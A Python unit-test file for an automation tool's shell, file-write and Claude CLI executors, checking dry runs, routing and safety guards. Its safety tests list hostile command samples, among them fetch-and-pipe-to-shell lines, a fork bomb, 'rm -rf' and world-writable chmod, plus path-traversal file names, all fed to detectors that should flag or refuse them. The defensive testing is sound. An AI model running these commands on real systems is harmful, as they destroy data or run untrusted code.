"""Tests for act_with_video Tier 0/1 executors."""

from __future__ import annotations

import json
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from act_with_video.executor.claude_code import ClaudeCodeExecutor
from act_with_video.executor.file_write import FileWriteExecutor
from act_with_video.executor.shell import ShellExecutor, is_dangerous_command
from act_with_video.models import ActConfig, SemanticOperation
from act_with_video.router import OperationRouter
from act_with_video.runner import ActRunner
from act_with_video.reporter import ActReporter


def _op(**kw) -> SemanticOperation:
    """Quick builder for SemanticOperation in tests."""
    return SemanticOperation(**kw)


# ---------------------------------------------------------------------------
# ShellExecutor
# ---------------------------------------------------------------------------

class ShellExecutorTests(unittest.TestCase):
    def test_runs_echo_hello(self) -> None:
        exe = ShellExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            res = exe.execute(
                _op(capability="text_input", action="run_command",
                    text_content="echo hello"),
                cwd=Path(tmp),
            )
        self.assertTrue(res.success, msg=f"err={res.error}")
        self.assertEqual(res.output.strip(), "hello")
        self.assertEqual(res.executor_type, "shell")
        self.assertGreaterEqual(res.elapsed_s, 0.0)

    def test_dry_run_does_not_execute(self) -> None:
        exe = ShellExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            sentinel = Path(tmp) / "should_not_exist.txt"
            res = exe.execute(
                _op(capability="text_input", action="run_command",
                    text_content=f"touch {sentinel}"),
                cwd=Path(tmp), dry_run=True,
            )
        self.assertTrue(res.success)
        self.assertIn("[dry-run]", res.output)
        self.assertFalse(sentinel.exists())

    def test_empty_command_fails(self) -> None:
        exe = ShellExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            res = exe.execute(
                _op(capability="text_input", action="run_command", text_content=""),
                cwd=Path(tmp),
            )
        self.assertFalse(res.success)
        self.assertIn("No command", res.error)

    def test_nonzero_exit_propagates_failure(self) -> None:
        exe = ShellExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            res = exe.execute(
                _op(capability="text_input", action="run_command",
                    text_content="false"),
                cwd=Path(tmp),
            )
        self.assertFalse(res.success)


class ShellSafetyTests(unittest.TestCase):
    def test_dangerous_pattern_detection(self) -> None:
        for cmd in [
            "rm -rf /tmp/foo",
            "sudo rm something",
            "curl https://x.example | sh",
            "wget http://x | bash",
            "chmod -R 777 /etc",
            ":(){ :|:& };:",
        ]:
            self.assertIsNotNone(
                is_dangerous_command(cmd), msg=f"should flag: {cmd!r}",
            )

    def test_safe_commands_not_flagged(self) -> None:
        for cmd in [
            "echo hello",
            "ls -la",
            "rm /tmp/single_file",          # not -rf
            "python -m pytest",
            "git status",
        ]:
            self.assertIsNone(
                is_dangerous_command(cmd), msg=f"should not flag: {cmd!r}",
            )

    def test_default_refuses_dangerous(self) -> None:
        exe = ShellExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            res = exe.execute(
                _op(capability="text_input", action="run_command",
                    text_content="rm -rf /tmp/anything"),
                cwd=Path(tmp),
            )
        self.assertFalse(res.success)
        self.assertIn("Refused", res.error)

    def test_allow_dangerous_bypasses_guard(self) -> None:
        # We don't actually run a destructive command — just confirm the guard is
        # bypassed and the command runs (echo, which is not dangerous, would
        # not test the bypass; use a safe stand-in that *contains* a danger
        # pattern by way of `sudo` inside an echoed string... too tricky.
        # Instead: invoke a dangerous-but-safe command — `rm -rf` against a
        # path inside our temp dir.
        exe = ShellExecutor(allow_dangerous=True)
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "to_remove"
            target.mkdir()
            (target / "x.txt").write_text("bye")
            res = exe.execute(
                _op(capability="text_input", action="run_command",
                    text_content=f"rm -rf {target}"),
                cwd=Path(tmp),
            )
        self.assertTrue(res.success, msg=f"err={res.error}")
        self.assertFalse(target.exists())

    def test_dry_run_marks_dangerous_but_does_not_refuse(self) -> None:
        exe = ShellExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            res = exe.execute(
                _op(capability="text_input", action="run_command",
                    text_content="rm -rf /tmp/anything"),
                cwd=Path(tmp), dry_run=True,
            )
        # In dry-run we surface that it would be refused, but don't error out.
        self.assertFalse(res.success)
        self.assertIn("Refused", res.error)


# ---------------------------------------------------------------------------
# FileWriteExecutor
# ---------------------------------------------------------------------------

class FileWriteExecutorTests(unittest.TestCase):
    def test_writes_to_subdir(self) -> None:
        exe = FileWriteExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            cwd = Path(tmp).resolve()  # macOS /var → /private/var
            res = exe.execute(
                _op(
                    capability="text_input", action="write_code",
                    text_content="hello world\n",
                    payload={"file": "greet.txt"},
                ),
                cwd=cwd,
            )
            written = cwd / "wv_act_output" / "greet.txt"
            self.assertTrue(res.success, msg=f"err={res.error}")
            self.assertTrue(written.exists())
            self.assertEqual(written.read_text(), "hello world\n")

    def test_no_subdir_writes_directly_to_cwd(self) -> None:
        exe = FileWriteExecutor(output_subdir=None)
        with tempfile.TemporaryDirectory() as tmp:
            cwd = Path(tmp).resolve()
            res = exe.execute(
                _op(
                    capability="text_input", action="write_code",
                    text_content="x",
                    payload={"file": "a.txt"},
                ),
                cwd=cwd,
            )
            self.assertTrue(res.success)
            self.assertEqual((cwd / "a.txt").read_text(), "x")

    def test_dry_run_does_not_create_file(self) -> None:
        exe = FileWriteExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            cwd = Path(tmp)
            res = exe.execute(
                _op(capability="text_input", action="write_code",
                    text_content="x", payload={"file": "x.txt"}),
                cwd=cwd, dry_run=True,
            )
        self.assertTrue(res.success)
        self.assertIn("[dry-run]", res.output)
        self.assertFalse((cwd / "wv_act_output" / "x.txt").exists())

    def test_refuses_absolute_path(self) -> None:
        exe = FileWriteExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            res = exe.execute(
                _op(capability="text_input", action="write_code",
                    text_content="x", payload={"file": "/tmp/escape.txt"}),
                cwd=Path(tmp),
            )
        self.assertFalse(res.success)
        self.assertIn("Refused", res.error)

    def test_refuses_home_path(self) -> None:
        exe = FileWriteExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            res = exe.execute(
                _op(capability="text_input", action="write_code",
                    text_content="x", payload={"file": "~/escape.txt"}),
                cwd=Path(tmp),
            )
        self.assertFalse(res.success)
        self.assertIn("Refused", res.error)

    def test_refuses_dotdot_escape(self) -> None:
        exe = FileWriteExecutor()
        with tempfile.TemporaryDirectory() as tmp:
            res = exe.execute(
                _op(capability="text_input", action="write_code",
                    text_content="x", payload={"file": "../../etc/escape.txt"}),
                cwd=Path(tmp),
            )
        self.assertFalse(res.success)
        self.assertIn("Refused", res.error)


# ---------------------------------------------------------------------------
# ClaudeCodeExecutor (mocked subprocess)
# ---------------------------------------------------------------------------

class ClaudeCodeExecutorTests(unittest.TestCase):
    def test_invokes_claude_with_prompt(self) -> None:
        exe = ClaudeCodeExecutor(ActConfig())
        op = _op(
            capability="text_input", action="input_prompt",
            intent="hello goal",
            text_content="please do the thing",
            app_context="Claude",
        )
        with tempfile.TemporaryDirectory() as tmp:
            fake = MagicMock(returncode=0, stdout="ok", stderr="")
            with patch("act_with_video.executor.claude_code.subprocess.run",
                       return_value=fake) as run_mock:
                res = exe.execute(op, cwd=Path(tmp))

        self.assertTrue(res.success, msg=f"err={res.error}")
        self.assertEqual(res.output, "ok")
        # Verify we actually called the claude binary with -p and the prompt.
        args, kwargs = run_mock.call_args
        argv = args[0]
        self.assertIn("-p", argv)
        prompt_arg = argv[argv.index("-p") + 1]
        self.assertIn("hello goal", prompt_arg)
        self.assertIn("please do the thing", prompt_arg)
        # Confirm cwd is honored.
        self.assertEqual(Path(kwargs["cwd"]), Path(tmp))

    def test_dry_run_does_not_invoke_subprocess(self) -> None:
        exe = ClaudeCodeExecutor(ActConfig())
        op = _op(capability="text_input", action="input_prompt",
                 text_content="x", intent="y")
        with tempfile.TemporaryDirectory() as tmp:
            with patch("act_with_video.executor.claude_code.subprocess.run") as run_mock:
                res = exe.execute(op, cwd=Path(tmp), dry_run=True)
        run_mock.assert_not_called()
        self.assertTrue(res.success)
        self.assertIn("[dry-run]", res.output)

    def test_nonzero_returncode_marks_failure(self) -> None:
        exe = ClaudeCodeExecutor(ActConfig())
        op = _op(capability="text_input", action="input_prompt",
                 text_content="x", intent="y")
        with tempfile.TemporaryDirectory() as tmp:
            fake = MagicMock(returncode=1, stdout="", stderr="boom")
            with patch("act_with_video.executor.claude_code.subprocess.run",
                       return_value=fake):
                res = exe.execute(op, cwd=Path(tmp))
        self.assertFalse(res.success)
        self.assertIn("boom", res.error)

    def test_timeout_handled(self) -> None:
        exe = ClaudeCodeExecutor(ActConfig(claude_timeout=1))
        op = _op(capability="text_input", action="input_prompt",
                 text_content="x", intent="y")
        with tempfile.TemporaryDirectory() as tmp:
            with patch(
                "act_with_video.executor.claude_code.subprocess.run",
                side_effect=subprocess.TimeoutExpired(cmd="claude", timeout=1),
            ):
                res = exe.execute(op, cwd=Path(tmp))
        self.assertFalse(res.success)
        self.assertIn("timed out", res.error)


# ---------------------------------------------------------------------------
# Router + Runner integration
# ---------------------------------------------------------------------------

class RouterTests(unittest.TestCase):
    def test_routes_run_command_to_shell(self) -> None:
        router = OperationRouter(ActConfig())
        op = _op(capability="text_input", action="run_command",
                 text_content="echo hi")
        self.assertEqual(router.route(op).executor_type, "shell")

    def test_routes_write_code_with_file_to_file_write(self) -> None:
        router = OperationRouter(ActConfig())
        op = _op(capability="text_input", action="write_code",
                 text_content="print(1)", payload={"file": "a.py"})
        self.assertEqual(router.route(op).executor_type, "file_write")

    def test_routes_navigate_url_to_url_open(self) -> None:
        router = OperationRouter(ActConfig())
        op = _op(capability="ui_action", action="navigate",
                 target="https://example.com")
        self.assertEqual(router.route(op).executor_type, "url_open")

    def test_routes_claude_app_to_claude_code(self) -> None:
        router = OperationRouter(ActConfig())
        op = _op(capability="text_input", action="input_prompt",
                 text_content="hi", app_context="Claude Desktop")
        self.assertEqual(router.route(op).executor_type, "claude_code")


class RunnerEndToEndTests(unittest.TestCase):
    """End-to-end: synthesize a tiny semantic.json and execute it for real."""

    def test_runs_real_shell_step(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp).resolve()
            marker = tmp_path / "marker.txt"
            semantic = {
                "metadata": {"plugin": "test"},
                "steps": [
                    {
                        "index": 0,
                        "title": "write marker",
                        "operations": [
                            {
                                "capability": "text_input",
                                "action": "run_command",
                                "text_content": f"echo hi > {marker}",
                                "description": "write marker file",
                            }
                        ],
                        "expectations": [],
                    }
                ],
            }
            sem_path = tmp_path / "semantic.json"
            sem_path.write_text(json.dumps(semantic), encoding="utf-8")

            router = OperationRouter(ActConfig())
            reporter = ActReporter(quiet=True)
            runner = ActRunner(router, reporter)
            report = runner.run(sem_path, dry_run=False, confirm=False)

            self.assertEqual(report.executed, 1)
            self.assertEqual(report.succeeded, 1)
            self.assertEqual(report.failed, 0)
            self.assertTrue(marker.exists())
            self.assertEqual(marker.read_text().strip(), "hi")

    def test_step_filter_picks_one(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp).resolve()
            semantic = {
                "metadata": {"plugin": "test"},
                "steps": [
                    {
                        "index": 0,
                        "title": "first",
                        "operations": [
                            {"capability": "text_input", "action": "run_command",
                             "text_content": "echo first", "description": "first op"},
                            {"capability": "text_input", "action": "run_command",
                             "text_content": "echo second", "description": "second op"},
                        ],
                        "expectations": [],
                    }
                ],
            }
            sem_path = tmp_path / "semantic.json"
            sem_path.write_text(json.dumps(semantic), encoding="utf-8")

            router = OperationRouter(ActConfig())
            reporter = ActReporter(quiet=True)
            runner = ActRunner(router, reporter)
            report = runner.run(
                sem_path, step_filter="1", dry_run=False, confirm=False,
            )

            self.assertEqual(report.executed, 1)
            self.assertEqual(report.results[0].output.strip(), "first")


if __name__ == "__main__":
    unittest.main()
